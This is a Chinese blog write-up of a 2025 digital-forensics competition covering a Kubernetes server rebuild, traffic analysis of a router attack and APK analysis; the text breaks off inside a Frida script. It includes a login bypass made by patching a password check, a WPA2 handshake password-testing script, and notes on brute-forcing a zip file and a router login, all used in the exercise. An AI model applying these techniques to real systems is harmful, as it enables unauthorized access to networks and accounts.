@@ -1,0 +1,2491 @@
+2025数证杯初赛
+https://mei-you-qian.github.io/2025/11/05/2025数证杯初赛/
+id=a043a739-d16a-42c6-bd4f-ae72f9d77598
+source=玫幽倩
+author=
+2025数证杯初赛
+一、服务器取证
+重构服务器
+一大堆废话（）（）（）（）
+不想看的可以直接点右边挪走，想看乐子的可以看我到底在干啥，我服务器太烂了，我好菜啊
+忠心感谢山警、小谢取证和406，谢谢你们
+失败版连接（但是连上ssh了）
+有4个镜像，是一个服务器集群Kubernetes (K8s)
+实在是不会搭这种服务器，我们跟着山警和小谢的教程走一遍吧
+https://mp.weixin.qq.com/s/xRqFqB1YFDs1oKWJK0MCTA?scene=1&click_id=4
+https://mp.weixin.qq.com/s/APyP-mcd40kGCn2U1RKrZA
+上来是先ip a看看网卡
+然后是cat /etc/host看看hosts
+看完之后，我们发现了有俩个node节点，因为是服务器集群，ip动了会很麻烦
+所以我们选择保留ip地址，把nat的网段改成192.50.1/24
+ping一下网关192.168.50.2
+可以ping通
+然后我们systemctl status sshd快速检查 SSHD（Secure Shell Daemon）服务的当前运行状态和关键配置信息
+发现SSHD服务正在运行，所以我们可以用主机连ssh
+ip就是ip，端口可以看到是22，FinalShell成功连上
+然后再看看k8s的配置情况
+1
+2
+3
+kubectl get namespaces -A
+kubectl get pods -A
+kubectl get services -A
+我这边的pods似乎是不存在error情况，如果存在的话可以使用命令
+1
+kubectl describe pods nfs-client-provisioner-79cc77f98-87xts -n nfs-storageclass
+现在我们已经连上了FinalShell
+在刚刚查service我们还看见了mysql
+同时在finalshell可以看到这些配置文件，可以全部下下来看看
+我们先把这些配置文件全部下载到本地方便查看
+这些配置文件大致可以分成五部分
+这样子五部分
+下边引用一下山警的介绍
+这里介绍一下k8s中的一些基本概念
+Deployment
+:
+类型
+: 工作负载资源 (Workload Resource)
+作用
+: 定义了应用程序的期望状态，负责管理和更新Pod（例如，创建、更新、扩缩容Pod）。它确保在任何给定时间都有指定数量的Pod在运行。
+PVC (Persistent Volume Claim)
+:
+类型
+: 存储资源 (Storage Resource)
+作用
+: 是用户对存储的需求声明。它请求特定大小和访问模式的持久化存储，并由Kubernetes动态或静态地与一个PV（Persistent Volume）进行绑定。
+Service
+:
+类型
+: 网络资源 (Networking Resource)
+作用
+: 定义了一组Pod的逻辑抽象，并为它们提供一个稳定的网络访问方式（一个固定的IP地址和DNS名称）。它使得应用程序的其他部分或其他服务能够发现并与这组Pod进行通信，而无需关心Pod的实际IP地址变化。
+ConfigMap
+:
+类型
+: 配置资源 (Configuration Resource)
+作用
+: 用于存储非敏感的配置数据，例如环境变量、命令行参数或配置文件。它将配置数据与应用程序镜像解耦，使得应用程序可以在不重新构建镜像的情况下轻松更改配置。
+这些yaml就是为对应的服务配置了这些api资源对象
+再次感谢山警公众号的指导
+接下来我们先进行对于MySQL的重建
+这边可以看到有一个configmap,一个deplovment和一个pvc
+我们肯定要用mysql80的pvc
+所以我们这边使用kubectl apply -f.yaml添加这些资源对象
+1
+2
+3
+4
+5
+kubectl apply -f mysql-c.yaml
+kubectl apply -f mysql-d.yaml
+kubectl apply -f mysql57-pvc.yaml
+kubectl apply -f mysql80-pvc.yaml
+kubectl apply -f mysql-services.yaml
+都配置一下
+之后再去看看kubectl get pods -A
+额，怎么是pending
+kubectl describe pod mysql80-5fc9f7b6f7-9lj97 -n default看看情况吧，主要看Events
+？？？说少一个mysql80-pvc？？？我不是刚刚配完吗
+噢不是没配，是mysql80-pvc 本身也处于 Pending状态，这意味着Kubernetes无法为它提供所需的存储卷。所以，依赖这个PVC的MySQL Pod自然也就无法启动
+所以是名为
+nfs-client
+的 StorageClass 动态制备PV（PersistentVolume）的过程失败了
+我们看看nfs的情况吧systemctl status nfs
+噢原来是压根没启动啊，完全不会，那就启动一下吧
+sudo systemctl start nfs-server
+好了嗷，这下成功running了
+但是还是显示pending，我们问问看ai
+欸我说。。不会四个全要一起仿真开着才行吧。。。
+我试试看吼。。
+好我全打开了
+这边那些pending啥的是全没了，变成一个新的看不懂的了
+不对啊。。。mysql怎么还是pending。。ContainerCreating又是啥状态。。
+实在不行我们先delete删除一下然后再开好了
+kubectl delete pod mysql80-5fc9f7b6f7-9lj97 -n default
+重启依旧pending。。说明确实是出问题了，可能存在污名等
+好！有人说是要这个样子调，我直接全删了我们重来一遍！
+成功版连接
+（我的意思是和山警这种正常了）
+我去，这样子打开之后真的和山警的一模一样是三个error了，MySQL也好起来了
+终于可以继续跟着教程走了
+三个error，当然是分别查看了
+1
+2
+3
+kubectl describe pods nfs-client-provisioner-79cc77f98-87xts -n nfs-storageclass
+kubectl describe pods redis-8b84f48-5pdqx
+kubectl describe pods captcha-bot-6b4d85b765-25xq6
+主要看Events，按顺序分别如下
+我们一个个看
+首先第一个nfs-client-provisioner-79cc77f98-87xts，分析出来差不多是nfs的问题
+我们知道了四台服务器，一个master，两个node，那那个计算机04其实就是nfs
+去04看看nfs的情况
+systemctl status nfs
+这边可以看到其实nfs是在动的，但是就算delete重启还是显示error
+这个时候没招了，想到去nmap一下，发现了filtered
+应该是防火墙的问题，我们继续在04虚拟机输入指令systemctl stop firewalld
+OK去掉之后再nmap一下发现确实没了
+这个时候delete一下pod就有了
+kubectl delete pod nfs-client-provisioner-79cc77f98-87xts -n nfs-storageclass
+变成这样子了
+kubectl edit deployment kubernetes-dashboard -n kubernetes-dashboard
+赶紧把这玩意去了
+好了回归error了嘻嘻
+没事嗷，现在redis和nfs都起起来了
+后边再说这个captcha，我们先起mysql
+连接mysql
+好我们终于可以到这一步了，感动中国
+还是跟之前一样，我们提取本地文件
+然后装上
+1
+2
+3
+4
+5
+kubectl apply -f mysql-c.yaml
+kubectl apply -f mysql-d.yaml
+kubectl apply -f mysql57-pvc.yaml
+kubectl apply -f mysql80-pvc.yaml
+kubectl apply -f mysql-services.yaml
+这一个轮回的mysql活的很安稳，终于可以继续了
+同时在mysql-d.yaml这边还有密码
+我们就能拿navicat连上了
+上边是连ssh，下边是连数据库，两步走
+感动中国
+登Kubernetes
+接下来我们登Kubernetes，这边发现已经是开着的了
+可以看到dashboard端口开在30001
+https://192.168.50.80:30001/
+直接登录网站
+问我们要token
+1
+kubectl create token dashboard-admin -n kube-system
+填进去就好了
+做服务器真的很让人感动，因为每推进一步都很兴奋
+在这边我们能看到Deployments也是俩开着一个关着
+接下来来重构发卡网站吧！
+重构发卡网站
+在Deployment这边我们没能看到所谓的发卡网站，可能已经删除
+但在PVC里我们看到是有dujiaoka的
+但就算点进去也找不到网站
+然而我们能在虚拟机04，也就是data1上找到一个备份压缩包
+1
+2
+3
+4
+tar -xvf dujiaoka.tar
+ls
+mv dujiaoka /data/k8s
+_data/default
+cd /data/k8s_
+data/default
+还原之后使用docker images检查node1 node2节点的镜像
+发现都没有这边root目录下找到的配置文件需要的 webdevops/php-nginx:7.4 镜像
+但是我们能在master节点发现这个镜像
+所以就要把这个镜像导出然后传输到工作节点载入
+1
+2
+3
+4
+5
+[root@master ~]# docker save -o php-nginx.tar webdevops/php-nginx:7.4
+[root@master ~]# scp php-nginx.tar node1:/tmp
+[root@master ~]# scp php-nginx.tar node2:/tmp
+[root@node1 ~]# cd /tmp;docker load -i php-nginx.tar
+[root@node2 ~]# cd /tmp;docker load -i php-nginx.tar
+传输过去,然后配置上
+当然之后也可以docker images看看
+导入完成后，运行php-nginx-deployment.yaml 配置文件创建pod
+kubectl apply -f php-nginx-deployment.yaml
+我去,红的
+发现缺失configmap
+我们这边执行kubectl apply -f dujiaoka-c.yaml 创建configMap
+然后在面板中重启发现还是报错，嘻嘻
+其实是和镜像有关
+我们docker tag ac09 webdevops/php-nginx:7.4 修改标签名字
+在node1节点和node2节点都干一边
+修好了!!!!
+(wp说captcha-bot由于没有互联网，是无法正常启动，这无需处理，好吧)
+接下来就能访问网站咯~
+http://192.168.50.80:31669/
+我感谢天，感谢地，感谢所有人
+然后就可以做题了
+还有就是我们在火眼分析的时候我的建议是不要多镜像分析
+还是分开来分析比较好
+1、node1节点的磁盘设备SHA256值前六位是？(字母全大写，答案格式：AAAAAA)（ ）
+搭完就能知道
+node1节点是虚拟机02
+所以我们看看这个磁盘设备的SHA256即可，火眼直接算
+FC9A341213AC06448213480AA639834A472D7138B70FA9A3A495A469B0281BE5
+前六位就是FC9A34
+2、集群配置了多少个node节点？（答案格式：1）（ ）
+cat /etc/hosts看hosts的时候就看见了有俩
+3、嫌疑人于什么时间修改master节点的root密码？（使用双位数格式，答案格式：00:00:00）（ ）
+都这样子问了，我们肯定是看看日志，过滤master和passwd
+过滤完就一条了
+所以是09:35:59
+4、Docker的安装日期是？（使用双位数格式，答案格式：01月01日）（ ）
+在历史命令里定位关键词docker和install可以看到这边是用的yum安装的Docker
+所以我们应该是去看看yum.log
+我们去master的机子上运行一下
+1
+grep "Installed:" /var/log/yum.log | grep docker-ce
+所以可以看到安装时间是04月08日
+5、Docker通过配置守护进程以使用全局代理，该代理地址的端口是？（答案格式：1）（ ）
+通过配置守护进程，那自然是去看配置文件了
+一般是这样子的HTTP_PROXY=这种
+我们在master节点上直接cat /lib/systemd/system/docker.service
+当然直接问ai，ai也会给指令，直接输入即可
+所以端口就是4780
+6、发卡网站使用的Mysql数据库对外访问端口是？（答案格式：1）（ ）
+kubectl get svc -A直接在master看mysql端口就好
+这边是30627
+7、发卡网站部署使用的镜像名称是？（答案格式：root/root）（ ）
+搭网站的时候就能看见配置文件，虽然网站里也有吧
+webdevops/php-nginx
+8、当前Telegram群管机器人使用的容器ID的前六位是？（答案格式：123abc）（ ）
+我们做到有docker容器了，在node1和node2节点，所以去这俩地方找
+群管机器人，那应该是bot吧
+搜到了
+检验一下确实是没问题
+所以id是8fadf590e1a8404ee09bb866f09547d699bbddd825b1a8dff5722aaef720994d
+前六位8fadf5
+9、发卡网站使用的缓存数据库是？（答案格式：mysql）（ ）
+我们在重构网站的时候明确用到了Redis
+所以答案就是redis
+当然了，网站根目录的.env文件直接写了
+10、集群中配置的发卡网站代码运行所在的物理目录是？（答案格式：/root/root）（ ）
+我们已经知道了发卡网站就是dujiaoka
+查看其PVC配置文件
+可以看到nfs.io/storage-path: “dujiaoka”
+即物理目录在nfs服务器物理目录下的/dujiaoka目录下
+在kubernetes上我们可以看到nfs服务器物理目录是/data/k8s_data/default
+所以总体合起来就是/data/k8s_data/default/dujiaoka
+11、Telegram群管机器人配置的API代理域名是？（答案格式：[
+www.xxx.com]）（
+）
+telegram群管机器人基本可以确定就是这个captcha-bot了
+但是这边并没有明确写清楚api代理域名到底是多少
+我们需要过去看看
+在data1机子上
+我们进config看看配置文件
+这边编码有点问题，ssh连接就好了
+但是还是很明显能看见api的代理域名
+http://kk.xilika.cc
+12、嫌疑人在Telegram上创建的群名称是？（答案格式：比武群）（ ）
+直接看配置文件看不见
+我们搭mysql的时候就注意到有个mysql数据库就叫captchabot
+这边点开看看
+很明显可以看到群名称就叫西门庆交流群
+13、统计嫌疑人在Telegram上创建的群中2025年6月之后成功入群的人数为？（答案格式：1）（ ）
+在数据库搜索就好了
+1
+2
+SELECT count(
+*) FROM captchabot.user_captcha_record AS ucr
+WHERE captcha_status = 1 AND captcha_success_time >= '2025-06-01 00:00:00';
+人数为2422
+14、据嫌疑人交代曾在发卡网上删除过一条订单数据，请找出该删除订单的订单号是？（答案格式：请按实际值填写）（ ）
+删除的数据，直接找是找不到的
+所以我们想到要去看看有没有日志
+正好注意到/data/k8s_data/default/mysql80路径下存在两个binlog文件
+即mysql的二进制日志
+我们把这俩拿出来之后转sql文件
+1
+2
+mysqlbinlog --no-defaults -vv --base64-output=DECODE-ROWS G:\电子取证题目\2025数证杯初赛\03-服务器取证\binlog.000001> G:\电子取证题目\2025数证杯初赛\03-服务器取证\demo1.sql
+mysqlbinlog --no-defaults -vv --base64-output=DECODE-ROWS G:\电子取证题目\2025数证杯初赛\03-服务器取证\binlog.000002> G:\电子取证题目\2025数证杯初赛\03-服务器取证\demo2.sql
+注意这边如果想要解析,一定要下对应版本的MySQL
+在navicat我们已经知道了是8.0.43的
+所以我们下一个这个版本的mysql
+https://blog.csdn.net/m0_62615283/article/details/150004572
+可以跟着这个走
+然后就能成功转化出sql文件了
+在demo2.sql里我们搜索DELETE
+成功找到订单号
+4V8XNK8Q02MD5D2R
+15、发卡网站上2025年6月之后订单交易成功的总金额是？忽略被删除的数据（答案格式：1）（ ）
+明显在dujiaoca数据库的orders表里
+我们sql检索一下
+主要是检索我们的status,时间和金额
+1
+2
+3
+4
+5
+SELECT SUM(actual
+_price)
+FROM `orders`
+WHERE `status` = 4
+AND updated_
+at >= '2025-06-01 00:00:00'
+AND deleted
+_at IS NULL;
+六月以后,是包括六月的,很神奇吧
+所以是295202
+16、发卡网站的后台访问路径是？（答案格式：/root）（ ）
+需要我们查看.env文件，就在网站根目录
+我不是很理解为什么这边我们用ls是看不见的，但是find能搜到啊
+cat看看就好了
+所以后台访问路径就是/admin
+所以我们其实可以登录后台了
+17、计算出用户密码算法中Salt的值，并进行Base64编码，结果是？（答案格式：请按实际值填写）（ ）
+独角数卡是一个开源项目
+是laravel框架的
+Laravel框架默认使用
+bcrypt
+算法来哈希密码，而
+BcryptHasher.php
+这个文件正是Laravel中负责实现
+bcrypt
+密码哈希的核心类
+所以我们去看看vendor/laravel/framework/src/Illuminate/Hashing/BcryptHasher.php，就在dujiaoka目录下，这个全路径有点长
+cat一下
+可以看到Base64编码的内容
+我们可以明白这个函数的意思
+1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+function getSalt()
+{
+$a = 'sdahjklhl212jkljass';
+$b = hash('sha256', $a, true); // 计算SHA256哈希（原始二进制数据）
+$c = substr($b, 0, 16); // 取前16字节作为密钥
+$d = base64_decode('xPfGJQaE1zE5d+8='); // Base64解码固定字符串
+$e = '';
+for ($i = 0; $i < strlen($d); $i++) { // 遍历$d的每个字符
+$e .= chr(ord($d[$i]) ^ ord($c[$i])); // 异或操作，结果追加到$e
+}
+return $e; // 返回盐值
+}
+我们运行一下就能得到盐值了
+1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+<?php
+function getSalt()
+{
+$a = 'sdahjklhl212jkljass';
+$b = hash('sha256', $a, true);
+$c = substr($b, 0, 16);
+$d = base64_decode('xPfGJQaE1zE5d+8=');
+$e = '';
+for ($i = 0; $i < strlen($d); $i++) {
+$e .= chr(ord($d[$i]) ^ ord($c[$i]));
+}
+return $e;
+}
+echo base64
+_encode(getSalt());
+?>
+返回了盐值
+lAID2ktDeRlGbcg=
+18、发卡网站配置的邮件发送人地址是？（答案格式：
+abc@abc.com
+）（ ）
+我们没有发卡网站的账密，无法登录，因此想要登录的话只能进行绕密处理
+这边对刚刚的php文件进行修改
+vim进去，然后把这一行改为下图
+因为这边是看parent::check()的返回值判断的
+返回 true，就表示验证成功
+所以我们!parent::check()，那随便输入一个错的就会变成对的了
+然后验证正确了，就能任意密码登录admin看后台了
+登录上去咯！
+然后去配置-系统设置-邮件服务
+成功看见配置的邮件服务的账号
+ituzz@qq.com
+19、当前发卡网站首页仪表盘中显示的发卡网站版本为？（答案格式：1.1.1）（ ）
+登录后台直接就能看见了
+登录后台方法看上题
+所以版本是2.0.5
+20、当前发卡网站中绑定的订单推送Telegram用户id为（答案格式：请按实际值填写）（ ）
+看订单推送设置就能看见id了
+6213151597
+二、流量包分析
+21、黑客攻击的目标路由器SSID为 （答案格式：请按实际值填写）（ ）
+问的是路由器SSID，我们先过滤一下路由器
+在下一题我们可以发现wifi的mac地址
+利用mac进行对路由器的过滤，过滤出源地址或目的地址是该Mac的内容，在过滤出的内容中搜索SSID
+所以MAC地址为ca:75:f4:65:f9:6a
+过滤一下：wlan.da==ca:75:f4:65:f9:6a||wlan.sa==ca:75:f4:65:f9:6a
+所以最后得到值为“laozhaoWIFI”
+22、黑客成功捕获了WIFI中WPA协议握手包，其中有效握手包组数为(完整握手为一组)（答案格式：1）（ ）
+要判断捕获的WPA握手包是否有效，关键在于确认其是否包含完整的四次握手过程。一组完整的四次握手包含四个连续的EAPOL协议数据包
+因此我们这边可以使用eapol过滤，寻找WPA握手包
+所以可以看到有效握手包组数是4组
+23、黑客爆破得出的WiFi密码为（提示：密码由小写英文字母和数字组成）（答案格式：abcd1234）（ ）
+这边有两种方法，一种是爆破，一种是找密码
+方法一：
+首先第一种就是爆破WIFI密码了
+爆破WPA协议密码需要握手包前两包（message1 和 message2）的认证参数
+所以我们保持上一题过滤eapol的状态，找到第一组完整的握手包。
+Message1：25420包处查看相关认证信息
+Message2：25421包处查看相关认证信息
+得到这两部分后我们利用ai写一个代码爆破（谢谢谢师傅）
+1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+69
+70
+71
+72
+73
+74
+75
+76
+77
+78
+79
+80
+81
+82
+83
+84
+85
+86
+87
+88
+89
+90
+91
+92
+93
+94
+95
+96
+97
+98
+99
+100
+101
+102
+103
+104
+105
+106
+107
+108
+109
+110
+111
+112
+113
+114
+115
+116
+117
+118
+119
+120
+121
+122
+123
+124
+125
+126
+127
+128
+129
+130
+131
+132
+133
+134
+135
+136
+137
+138
+139
+140
+141
+142
+143
+144
+145
+146
+147
+148
+149
+150
+151
+152
+153
+154
+155
+156
+157
+158
+159
+160
+161
+162
+163
+164
+165
+166
+167
+168
+#!/usr/bin/env python3
+# -
+*- coding: utf-8 -*
+-
+import hashlib
+import hmac
+import binascii
+from pbkdf2 import PBKDF2
+class WPA2HandshakeAnalyzer:
+def __init__(self):
+# 从抓包数据中提取的信息
+self.anonce = "36c219dc3afe12534ad501628c9a99528fb24c06f7e9dc7f0166f19d74c9d74f"
+self.snonce = "151eba384e0fe7bd0dfbba66844d00f99609909a9bf6b529f63f1c62959f59bc"
+self.mic = "74637af2b87fce31425365282c08cc4c"
+self.eapol_frame = "dd180050f20101000050f20401000050f20401000050f2020c00"
+# 需要填写的网络信息
+self.ssid = ""  # 在这里填写 SSID
+self.password = ""  # 在这里填写明文密码
+# MAC 地址信息（需要从完整抓包中获取）
+self.ap_mac = ""  # AP 的 MAC 地址
+self.sta_mac = ""  # 客户端的 MAC 地址
+def prf(self, key, label, data, length):
+"""伪随机函数 PRF-X"""
+result = b''
+counter = 0
+while len(result) < length:
+hmac_input = label + b'\x00' + data + bytes([counter])
+result += hmac.new(key, hmac_input, hashlib.sha1).digest()
+counter += 1
+return result[:length]
+def generate_pmk(self, ssid, password):
+"""生成 PMK (Pairwise Master Key)"""
+return PBKDF2(password, ssid, 4096).read(32)
+def generate_ptk(self, pmk, anonce, snonce, ap_mac, sta_mac):
+"""生成 PTK (Pairwise Transient Key)"""
+# 创建 PRF 输入数据
+label = b"Pairwise key expansion"
+# MAC 地址按字典序排序
+if ap_mac < sta_mac:
+mac_data = binascii.unhexlify(ap_mac.replace(':', '')) + \
+binascii.unhexlify(sta_mac.replace(':', ''))
+else:
+mac_data = binascii.unhexlify(sta_mac.replace(':', '')) + \
+binascii.unhexlify(ap_mac.replace(':', ''))
+# Nonce 按字典序排序
+if anonce < snonce:
+nonce_data = binascii.unhexlify(anonce) + binascii.unhexlify(snonce)
+else:
+nonce_data = binascii.unhexlify(snonce) + binascii.unhexlify(anonce)
+prf_input = mac_data + nonce_data
+# 生成 64 字节的 PTK
+ptk = self.prf(pmk, label, prf_input, 64)
+return {
+'kck': ptk[:16],  # Key Confirmation Key
+'kek': ptk[16:32],  # Key Encryption Key
+'tk': ptk[32:48],  # Temporal Key
+'mic_key': ptk[48:64] if len(ptk) > 48 else ptk[:16]
+}
+def calculate_mic(self, kck, eapol_data):
+"""计算 EAPOL 帧的 MIC"""
+# 将 MIC 字段置零后计算
+eapol_bytes = binascii.unhexlify(eapol_data)
+# 构造完整的 EAPOL 帧（简化版本）
+eapol_frame = bytearray([
+0x01,  # Version
+0x03,  # Type (Key)
+0x00, 0x79,  # Length (121)
+0xfe,  # Key Descriptor Type
+0x01, 0x0a,  # Key Information
+0x00, 0x10,  # Key Length
+0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01,  # Replay Counter
+])
+# 添加 SNonce
+eapol_frame.extend(binascii.unhexlify(self.snonce))
+# 添加 Key IV (16 字节零)
+eapol_frame.extend(b'\x00' * 16)
+# 添加 Key RSC (8 字节零)
+eapol_frame.extend(b'\x00' * 8)
+# 添加 Key ID (8 字节零)
+eapol_frame.extend(b'\x00' * 8)
+# 添加 MIC 位置（16 字节零，稍后会被替换）
+mic_offset = len(eapol_frame)
+eapol_frame.extend(b'\x00' * 16)
+# 添加 Key Data Length
+eapol_frame.extend(b'\x00\x1a')  # 26 字节
+# 添加 Key Data
+eapol_frame.extend(binascii.unhexlify(self.eapol_frame))
+# 计算 MIC
+calculated_mic = hmac.new(kck, eapol_frame, hashlib.sha1).digest()[:16]
+return calculated_mic.hex()
+def verify_handshake(self):
+"""验证握手过程"""
+if not all([self.ssid, self.password, self.ap_mac, self.sta_mac]):
+print("错误：请填写完整的网络信息（SSID、密码、MAC 地址）")
+return False
+print("=== WPA2 握手验证 ===")
+print(f"SSID: {self.ssid}")
+print(f"密码: {self.password}")
+print()
+# 步骤 1：生成 PMK
+pmk = self.generate_pmk(self.ssid.encode(), self.password)
+print(f"PMK: {pmk.hex()}")
+# 步骤 2：生成 PTK
+ptk = self.generate_ptk(pmk, self.anonce, self.snonce, self.ap_mac, self.sta_mac)
+print(f"KCK: {ptk['kck'].hex()}")
+print(f"KEK: {ptk['kek'].hex()}")
+print(f"TK: {ptk['tk'].hex()}")
+print()
+# 步骤 3：验证 MIC
+calculated_mic = self.calculate_mic(ptk['kck'], self.eapol_frame)
+print(f"抓包中的 MIC: {self.mic}")
+print(f"计算出的 MIC: {calculated_mic}")
+# 验证结果
+if calculated_mic.lower() == self.mic.lower():
+print("\n✓ MIC 验证成功！密码正确。")
+return True
+else:
+print("\n✗ MIC 验证失败！密码可能错误。")
+return False
+def test_passwords(self, password_list):
+"""批量测试密码"""
+print("=== 批量密码测试 ===")
+for password in password_list:
+self.password = password
+print(f"测试密码: {password}")
+if self.verify_handshake():
+print(f"\n 找到正确密码: {password}")
+return password
+print("-" * 40)
+print("未找到正确密码")
+return None
+def main():
+# 创建分析器实例
+analyzer = WPA2HandshakeAnalyzer()
+# 设置网络信息（请根据实际情况填写）
+analyzer.ssid = "laozhaoWIFI"  # 替换为实际SSID
+analyzer.ap_mac = "ca:75:f4:65:f9:6a"  # 替换为AP的MAC地址
+analyzer.sta_mac = "8e:39:bd:31:2e:1d"  # 替换为客户端的MAC地址
+# 批量密码测试示例
+test_passwords = [
+"password1110",
+"12345678",
+"admin123",
+"您的 WiFi 密码",  # 在这里添加更多要测试的密码
+]
+# 运行密码测试
+analyzer.test_passwords(test_passwords)
+if
+__name__
+== "
+__main__
+":
+# 需要安装依赖：pip install pbkdf2
+try:
+main()
+except ImportError:
+print("请先安装依赖包：pip install pbkdf2")
+记得用的时候安装好依赖包，然后把mac，ssid什么的替换一下（说起来这个password的验证范围是不是有点扯啊。这边的测试密码得改成字典还差不多吧（））
+得到了密码password1110
+方法一确实是麻烦的要死啊，我们可以用方法二直接找
+方法二：
+方法二主要是结合后面的题目，我们可以发现黑客后面获取到了路由器的管理后台
+所以猜测管理后台中存在wifi的密码，直接追踪HTTP流量进行查看
+也不亚于大海捞针了，不过一般确实会搜password
+搜完发现是key，作为密码，倒也合理（或许吧）
+24、黑客成功连接Wifi后，发现路由器操作系统为？（答案格式：请按实际值填写）（ ）
+也算是开拓了一种新思路了
+当我们看见html代码的时候可以保存为html文件打开看看
+这边我们继续过滤http流量
+能看到html代码
+保存之后浏览器打开
+这边很明显有加蓝的
+Powered by这就是操作系统
+ImmortalWrt
+25、黑客对路由器后台进行爆破攻击，该路由器后台密码为（答案格式：请按实际值填写）（ ）
+我们在第二题已经爆破了路由器的后台密码
+所以获得密码肯定是要在肯定在获取数据之前，并且根据前几题就都知道是使用的http协议
+所以我们依旧保持着http过滤
+追踪http流后搜索password
+看到了password的名字叫luci_password，我们拿这个继续搜
+可以看到他试了好多次
+直到试出来了答案是password，停手了
+所以这题答案是password
+26、黑客通过修改路由器设置，将被劫持的域名为（答案格式：[
+www.xxx.com]）（
+）
+我们先过滤dns
+如果说他劫持了一个域名，那么查询的时候应该是响应域名存在，并且响应的域名IP为内网IP
+根据这个思路，我们进行定位，我们直接过滤dns协议并且响应成功的内容
+dns && dns.flags.rcode==0
+过滤完之后很明确了就是这个
+www.qq.com
+27、黑客在路由器管理后台发现FTP服务配置，FTP登录密码为？（答案格式：请按实际值填写）（ ）
+问ftp，所以我们当然过滤ftp啦
+然后看见了密码是mast
+28、黑客通过FTP上传了一个压缩包文件，该文件内容为（答案格式：请按实际值填写）（ ）
+就这一个压缩包，很明确是这个，我们先提取出来
+过滤ftp-data
+成功定位到，提取出来就好
+注意这边一定要先切换到原始数据再提取
+提取出来之后发现加密
+但是没密码
+一爆破就发现密码就是4321，马上爆出来了
+所以内容为code:123456789
+29、黑客通过路由器执行shell脚本，反弹shell的监听端口为（答案格式：1）（ ）
+应该是通过ftp上传的反弹shell，最后这个最像
+所以我们根据这边传输成功的流量搜索http协议
+http||http contains “/bin/sh”
+发现这个http携带的内容中存在/bin/sh的内容
+而其访问的监听端口为4445
+所以答案就是4445
+30、黑客通过反弹shell成功控制目标路由器后，总共执行了多少条命令（答案格式：1)（ ）
+一共就是这样子4条命令
+三、APK程序分析
+31、apk 的版本名称为？ （答案格式：1.1.1）（ ）
+这边直接看xml文件，就能看到android:versionName=”3.0.12”
+所以版本名称为3.0.12
+32、在该APP中，调用了哪个System的方法用于获取本地系统的时间戳？（答案格式：MainActivity）（ ）
+首先是调用哪个System的方法能用于获取本地系统的时间戳
+发现是currentTimeMillis这个方法
+我们搜一下有没有用这个呢
+好确实用了，都是在拿这个
+所以这题就是这个currentTimeMillis
+33、apk运行后getVer()的返回值是多少？（答案格式：1.0.0）（ ）
+很明显 这一题和34两道题全都是需要动调才能出来的
+分析主函数就可以看得出来，全都藏起来了，只有动调才能看见，这意味着我们需要写Frida脚本
+我们需要动调出MultiLayerEncryption.multiLayerEncrypt(“check_apk_status”)和MainActivity.apkHash, MainActivity.getVer(), MainActivity.ts
+比赛的时候我也有想过写脚本，但是ai不给力，没写出来，自己也是一点都写不来
+这边偷懒抄一下，我会一点点理解的（下边是406的脚本，若侵权我马上删除）
+1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+69
+70
+71
+72
+73
+74
+75
+76
+77
+78
+79
+80
+81
+82
+83
+84
+85
+86
+87
+88
+89
+90
+91
+92
+93
+94
+95
+96
+97
+98
+99
+100
+101
+102
+103
+104
+105
+106
+107
+108
+109
+110
+111
+112
+113
+114
+115
+116
+117
+118
+119
+120
+121
+122
+123
+124
+125
+126
+127
+128
+129
+130
+131
+132
+133
+134
+135
+136
+137
+138
+139
+140
+141
+142
+143
+144
+145
+146
+147
+148
+149
+150
+151
+152
+153
+154
+155
+156
+157
+158
+159
+160
+161
+162
+163
+164
+// =============== 脚本开始 ===============
+console.log("[
+*] Frida 脚本已加载，正在等待目标类加载...");
+// 存储捕获到的值
+let capturedValues = {
+encryptedPath: null,
+apkHash: null,
+appVer: null,
+timestamp: null
+};
+// 简化日志函数
+function log(msg) {
+console.log(`[+] ${msg}`);
+}
+function error(msg) {
+console.error(`[!] ${msg}`);
+}
+// 通用函数：等待类加载
+function waitForClass(className, callback, timeout = 30000) {
+const startTime = Date.now();
+const interval = setInterval(() => {
+try {
+const clazz = Java.use(className);
+clearInterval(interval);
+log(`✅ 类 ${className} 已加载`);
+callback(clazz);
+} catch (e) {
+if (Date.now() - startTime > timeout) {
+clearInterval(interval);
+error(`❌ 等待类 ${className} 超时 (${timeout}ms)`);
+}
+}
+}, 100);
+}
+// 生成并打印最终 URL
+function generateAndPrintURL() {
+const { encryptedPath, apkHash, appVer, timestamp } = capturedValues;
+if (encryptedPath !== null && apkHash !== null && appVer !== null && timestamp !== null) {
+const port = 60723;
+const baseUrl = `http://localhost:${port}`;
+const path = encodeURIComponent(encryptedPath);
+const queryString = `hash=${apkHash}&ver=${appVer}&ts=${timestamp}`;
+const fullUrl = `${baseUrl}/${path}?${queryString}`;
+console.log("=".repeat(60));
+log("🎉 恭喜！已成功捕获所有必要信息！");
+log(`完整后门 URL:`);
+console.log(`\x1b[32m${fullUrl}\x1b[0m`); // 绿色输出
+console.log("=".repeat(60));
+} else {
+// 如果还未完全捕获，可以输出当前状态（可选）
+// log(`当前捕获状态: encryptedPath=${encryptedPath}, apkHash=${apkHash}, appVer=${appVer}, timestamp=${timestamp}`);
+}
+}
+// =============== 主函数入口 ===============
+Java.perform(function () {
+// 1. 等待 MainActivity 加载
+waitForClass("net.net.MainActivity", function (MainActivityClass) {
+log("✅ 类 net.net.MainActivity 已加载");
+log("正在主动调用关键方法以获取所有参数...");
+// ========== 主动调用所有关键方法和字段 ==========
+Java.perform(function () {
+try {
+// 1. 获取并调用 MultiLayerEncryption.multiLayerEncrypt
